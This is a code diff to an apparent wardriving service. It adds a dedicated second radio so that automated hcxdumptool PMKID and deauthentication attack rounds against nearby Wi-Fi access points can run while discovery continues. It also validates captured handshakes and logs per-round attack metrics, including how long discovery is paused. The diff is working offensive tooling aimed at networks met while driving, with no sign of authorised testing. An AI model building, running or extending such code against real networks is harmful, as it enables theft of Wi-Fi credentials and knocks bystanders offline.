@@ -118,6 +118,18 @@ export class DriveWardriveService extends EventEmitter {
   // In-memory air picture (rebuilt every session; the DB is the archive)
   private air = new Map<string, AirAp>();
   private apState = new Map<string, ApSessionState>();
+  // Radio count preference: "single" (one dongle does discovery AND
+  // attacks, with blind windows during attacks) or "dual" (discovery dongle
+  // + dedicated attacker dongle when two monitor-capable adapters are
+  // present). Operator-settable from the web UI; "auto" = dual when 2+
+  // dongles, single otherwise.
+  private radioMode: "auto" | "single" | "dual" = (process.env.WARDRIVE_RADIO_MODE as any) || "auto";
+  // Effective mode for the RUNNING session (resolved at start).
+  private dualRadio = false;
+  // The dedicated ATTACK radio (dual mode): every hcxdumptool round lives
+  // here and the discovery capture keeps running on this.iface untouched.
+  private attackIface: string | null = null;
+  private attackIfaceMac: string | null = null;
   // ssid -> handshake knowledge from the DB at session start
   private knownHandshakeSsids = new Set<string>();
   // SSIDs the operator has actively attacked in past sessions — targeting
@@ -157,6 +169,9 @@ export class DriveWardriveService extends EventEmitter {
   private attackUntil = 0;
   private attackMethod: "pmkid" | "deauth" = "pmkid";
   private attackBusy = false; // an hcxdumptool/aireplay round is on the wire
+  // Wall-clock of the attack window starting — drives the per-round
+  // blind_ms metric (dual mode counts ~0: discovery keeps running).
+  private roundStartedAt = 0;
   private pmkidRunner: PmkidDriveRunner | null = null;
   // hcx conversions in flight (bssid -> promise) so a burst never double-
   // fires an extraction while the previous one is still reading the ring.
@@ -218,6 +233,32 @@ export class DriveWardriveService extends EventEmitter {
       await enterMonitorMode(this.iface);
       this.channels = await getAvailable24GhzChannels(this.phy!);
       if (this.channels.length === 0) this.channels = [1, 6, 11];
+      // Dual-radio split (when the operator allows it AND a second
+      // monitor-capable dongle is present): the discovery radio keeps
+      // hopping/capturing; this second one does every attack round.
+      this.dualRadio = false;
+      this.attackIface = null;
+      this.attackIfaceMac = null;
+      try {
+        const adapters = await listAdaptersForUI(this.preferredMac);
+        const second = this.resolveDualRadio({ iface: this.iface, mac: info.mac }, adapters);
+        if (second.iface) {
+          // The attack radio also needs its own monitor-mode setup once;
+          // hcxdumptool re-enters monitor per round (as it does today on
+          // the shared iface) but enterMonitorMode preps phy+name cleanly.
+          await enterMonitorMode(second.iface);
+          this.attackIface = second.iface;
+          this.attackIfaceMac = second.mac;
+          this.dualRadio = true;
+          console.log(`[wardrive] DUAL radio: discovery=${this.iface} attack=${this.attackIface}`);
+        } else {
+          console.log(`[wardrive] radio mode: single (discovery=${this.iface})`);
+        }
+      } catch (err: any) {
+        console.warn("[wardrive] dual-radio resolve failed:", err?.message || err);
+        this.dualRadio = false;
+        this.attackIface = null;
+      }
       this.running = true;
       this.beginSession(false);
       this.startHopper();
@@ -255,6 +296,18 @@ export class DriveWardriveService extends EventEmitter {
     // in normal operation).
     disarmHomeNetworkWatchdog();
     this.homeSsid = null;
+    // Release the dedicated attack radio (dual mode) the same way the
+    // discovery one is released.
+    if (this.attackIface && this.attackIface !== this.iface) {
+      const atk = this.attackIface;
+      this.attackIface = null;
+      this.dualRadio = false;
+      this.attackIfaceMac = null;
+      await killStrayCaptures(atk);
+      await exitMonitorMode(atk).catch((err) =>
+        console.warn(`[wardrive] failed to restore attack radio ${atk}:`, err?.message || err),
+      );
+    }
     if (restore && this.iface) {
       const iface = this.iface;
       this.iface = null;
@@ -278,6 +331,52 @@ export class DriveWardriveService extends EventEmitter {
     if (this.demo === demo) return;
     if (this.running) void this.stop();
     this.demo = demo;
+  }
+
+  // ─── Radio mode (1 vs 2 adapters) ──────────────────────────────────────
+
+  setRadioMode(mode: string): { ok: boolean; error?: string } {
+    if (mode !== "auto" && mode !== "single" && mode !== "dual") {
+      return { ok: false, error: "mode debe ser 'auto' | 'single' | 'dual'" };
+    }
+    if (this.running) {
+      return { ok: false, error: "Detené la sesión activa antes de cambiar el modo de radios" };
+    }
+    this.radioMode = mode;
+    console.log(`[wardrive] radio mode: ${mode}`);
+    this.broadcastStatus();
+    return { ok: true };
+  }
+
+  getRadioMode(): "auto" | "single" | "dual" {
+    return this.radioMode;
+  }
+
+  // Resolve dual vs single: "dual" demands a second monitor-capable
+  // dongle; "auto" takes it when one exists. The second dongle must be a
+  // DIFFERENT physical adapter than the discovery one (same dongle twice
+  // defeats the split).
+  private resolveDualRadio(
+    discovery: { iface: string; mac?: string | null },
+    available: ReturnType<typeof listAdaptersForUI> extends Promise<infer T> ? T : never,
+  ): { iface: string | null; mac: string | null } {
+    const mode = this.radioMode;
+    if (mode === "single") return { iface: null, mac: null };
+    const candidates = (available.adapters || []).filter(
+      (a: any) =>
+        a.monitorSupported &&
+        a.mac &&
+        (!discovery.mac || String(a.mac).toLowerCase() !== String(discovery.mac).toLowerCase()),
+    );
+    if (mode === "dual" && candidates.length === 0) {
+      console.warn("[wardrive] dual solicitado pero no hay segundo dongle monitor-capable — cayendo a single");
+      return { iface: null, mac: null };
+    }
+    if (candidates.length === 0) return { iface: null, mac: null };
+    // Prefer another ath9k_htc (same deterministic-EAPOL driver class as the
+    // discovery pick).
+    candidates.sort((a: any, b: any) => (a.driver === "ath9k_htc" ? -1 : 0) - (b.driver === "ath9k_htc" ? -1 : 0));
+    return { iface: candidates[0].iface, mac: candidates[0].mac };
   }
 
   // ─── Dongle selection ──────────────────────────────────────────────────
@@ -658,6 +757,7 @@ export class DriveWardriveService extends EventEmitter {
   private async attackAp(ap: AirAp, st: ApSessionState): Promise<void> {
     if (!this.iface || !this.running || this.attackBusy) return;
     this.attackBusy = true;
+    this.roundStartedAt = Date.now();
     this.attackBssid = ap.bssid;
     this.attackChannel = ap.channel || this.currentChannel || 1;
     // One window + settle margin, so the UI/hopper know exactly how long
@@ -702,14 +802,18 @@ export class DriveWardriveService extends EventEmitter {
       const bpfFile = `${pcapngPath}.bpf`;
       const bpfPath = await writeBpfForAp(ap.bssid, bpfFile);
       if (bpfPath) {
-        // Pause the discovery pipeline (it holds the iface in monitor mode).
-        this.capture?.stop();
-        this.capture = null;
-        this.hopTimerPause = true;
+        // SINGLE mode: pause the discovery pipeline (it holds the iface in
+        // monitor mode). DUAL mode: the attack radio is dedicated — the
+        // discovery capture keeps running untouched.
+        if (!this.dualRadio) {
+          this.capture?.stop();
+          this.capture = null;
+          this.hopTimerPause = true;
+        }
         try {
           capturedHere = await this.runPmkidRound(ap, pcapngPath, bpfPath, st);
         } finally {
-          this.hopTimerPause = false;
+          if (!this.dualRadio) this.hopTimerPause = false;
         }
       } else {
         console.warn(`[wardrive] PMKID skip ${ap.ssid}: BPF compile failed`);
@@ -732,22 +836,25 @@ export class DriveWardriveService extends EventEmitter {
         const bpfFile = `${pcapngPath}.bpf`;
         const bpfPath = await writeBpfForAp(ap.bssid, bpfFile);
         if (bpfPath) {
-          this.capture?.stop();
-          this.capture = null;
-          this.hopTimerPause = true;
+          if (!this.dualRadio) {
+            this.capture?.stop();
+            this.capture = null;
+            this.hopTimerPause = true;
+          }
           try {
             capturedHere = await this.runPmkidRound(ap, pcapngPath, bpfPath, st);
           } finally {
-            this.hopTimerPause = false;
+            if (!this.dualRadio) this.hopTimerPause = false;
           }
         }
       }
     }
 
-    // Restart the discovery pipeline once, at the very end (each round
-    // leaves the iface in whatever mode hcxdumptool left it; DriveCapture
-    // re-enters monitor mode itself).
-    if (this.running && !this.capture) {
+    // SINGLE mode only: restart the discovery pipeline once, at the very
+    // end (each round leaves the iface in whatever mode hcxdumptool left
+    // it; DriveCapture re-enters monitor mode itself). In DUAL mode the
+    // discovery capture never stopped.
+    if (!this.dualRadio && this.running && !this.capture) {
       this.capture = new DriveCapture();
       this.capture.on("frame", (frame: DriveFrame) => this.onFrame(frame));
       this.capture.start(this.iface!, this.ringDir!);
@@ -765,16 +872,19 @@ export class DriveWardriveService extends EventEmitter {
   // One hcxdumptool PMKID window against ONE AP. Resolves true when the
   // round produced an extractable capture (validated with hcxpcapngtool).
   private async runPmkidRound(ap: AirAp, pcapngPath: string, bpfPath: string, st: ApSessionState): Promise<boolean> {
-    if (!this.sessionDir || !this.iface) return false;
+    // DUAL: the round runs on the dedicated attack radio (discovery keeps
+    // running on this.iface); SINGLE: the shared iface (blind window).
+    const atkIface = this.dualRadio && this.attackIface ? this.attackIface : this.iface;
+    if (!this.sessionDir || !atkIface) return false;
     // hcxdumptool needs the iface DOWN and NOT in monitor mode — it does
     // its own mode/MAC/channel dance. Drop our monitor setup first.
-    await this.downIface(this.iface);
+    await this.downIface(atkIface);
     try {
       fs.rmSync(pcapngPath, { force: true });
     } catch {
       // non-fatal
     }
-    const runner = new PmkidDriveRunner(this.iface, ap.bssid, pcapngPath, ap.channel || 1, PMKID_WINDOW_MS, bpfPath);
+    const runner = new PmkidDriveRunner(atkIface, ap.bssid, pcapngPath, ap.channel || 1, PMKID_WINDOW_MS, bpfPath);
     this.pmkidRunner = runner;
     runner.on("hit", () => {
       // [PMKID:...] marker — give hcxdumptool a beat to write the file; the
@@ -788,19 +898,22 @@ export class DriveWardriveService extends EventEmitter {
     });
     const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
     this.activity(`Atacando PMKID → ${ap.ssid} (ch${ap.channel})`, "attack");
-    console.log(`[wardrive] PMKID round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${PMKID_WINDOW_MS}ms`);
+    console.log(`[wardrive] PMKID round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${PMKID_WINDOW_MS}ms ${this.dualRadio ? "[attack radio]" : "[shared radio]"}`);
     runner.start();
     await Promise.race([exited, sleep(PMKID_WINDOW_MS + 8_000)]);
     runner.stop();
     this.pmkidRunner = null;
     await sleep(ATTACK_SETTLE_MS);
-    return await this.validateRound(ap, st, pcapngPath, "pmkid");
+    const ok = await this.validateRound(ap, st, pcapngPath, "pmkid");
+    this.logRound(ap, "pmkid", PMKID_WINDOW_MS, ok, st?.eapolFrames ?? 0);
+    return ok;
   }
 
   // Secondary mechanism: deauth + capture in ONE window. Same writer
   // split as the PMKID round: hcxdumptool attacks (no -w), dumpcap writes.
   private async runDeauthRound(ap: AirAp, st: ApSessionState): Promise<boolean> {
-    if (!this.iface || !this.running || !this.sessionDir) return false;
+    const atkIface = this.dualRadio && this.attackIface ? this.attackIface : this.iface;
+    if (!atkIface || !this.running || !this.sessionDir) return false;
     st.lastDeauthAt = Date.now();
     const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
     const pcapngPath = path.join(this.sessionDir, `${prefix}-deauth.pcapng`);
@@ -811,14 +924,17 @@ export class DriveWardriveService extends EventEmitter {
     }
     const bpfFile = await writeBpfForAp(ap.bssid, `${pcapngPath}.bpf`);
     if (!bpfFile) return false;
-    // hcxdumptool owns the iface: pause the discovery pipeline + hopper.
-    this.capture?.stop();
-    this.capture = null;
-    this.hopTimerPause = true;
+    // SINGLE mode: hcxdumptool owns the shared iface — pause discovery +
+    // hopper. DUAL mode: the attack radio is dedicated, discovery continues.
+    if (!this.dualRadio) {
+      this.capture?.stop();
+      this.capture = null;
+      this.hopTimerPause = true;
+    }
     try {
-      await this.downIface(this.iface);
+      await this.downIface(atkIface);
       const runner = new PmkidDriveRunner(
-        this.iface,
+        atkIface,
         ap.bssid,
         pcapngPath,
         ap.channel || 1,
@@ -831,18 +947,44 @@ export class DriveWardriveService extends EventEmitter {
       this.attackMethod = "deauth";
       const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
       this.activity(`Atacando DEAUTH → ${ap.ssid} (ch${ap.channel})`, "attack");
-      console.log(`[wardrive] DEAUTH round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${DEAUTH_WINDOW_MS}ms`);
+      console.log(`[wardrive] DEAUTH round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${DEAUTH_WINDOW_MS}ms ${this.dualRadio ? "[attack radio]" : "[shared radio]"}`);
       runner.startWithDeauth();
       await Promise.race([exited, sleep(DEAUTH_WINDOW_MS + 8_000)]);
       runner.stop();
       this.pmkidRunner = null;
       await sleep(ATTACK_SETTLE_MS);
-      return await this.validateRound(ap, st, pcapngPath, "deauth");
+      const ok = await this.validateRound(ap, st, pcapngPath, "deauth");
+      this.logRound(ap, "deauth", DEAUTH_WINDOW_MS, ok, st?.eapolFrames ?? 0);
+      return ok;
     } finally {
-      // The unified restart at the end of attackAp() brings discovery back;
-      // this finally only guarantees we never leave the iface owned by a
-      // dead hcxdumptool.
+      // The unified restart at the end of attackAp() brings discovery back
+      // (single mode); this finally only guarantees we never leave the
+      // iface owned by a dead hcxdumptool.
     }
+  }
+
+  // Per-round metrics row — the 1-vs-2-adapter comparison dataset. blind_ms
+  // = how long the DISCOVERY pipeline was down for this round: full window
+  // + overhead in single mode, ≈0 in dual mode.
+  private logRound(
+    ap: AirAp,
+    method: string,
+    windowMs: number,
+    ok: boolean,
+    eapolPairs: number,
+    aborted = false,
+  ): void {
+    const blind = this.dualRadio ? 0 : windowMs + ATTACK_SETTLE_MS;
+    driveDb.recordAttackRound({
+      bssid: ap.bssid,
+      ssid: ap.ssid,
+      method,
+      mode: this.dualRadio ? "dual" : "single",
+      windowMs,
+      result: aborted ? "aborted" : ok ? "captured" : "failed",
+      blindMs: blind,
+      eapolPairs: Math.max(0, eapolPairs),
+    });
   }
 
   // Post-window validation, shared by both methods: the attack-window
@@ -1243,6 +1385,9 @@ export class DriveWardriveService extends EventEmitter {
       },
       iface: this.iface,
       preferredMac: this.preferredMac,
+      radioMode: this.radioMode,
+      dualRadio: this.dualRadio,
+      attackIface: this.dualRadio ? this.attackIface : null,
       homeSsid: this.homeSsid,
       error: this.error,
       channel: this.currentChannel,
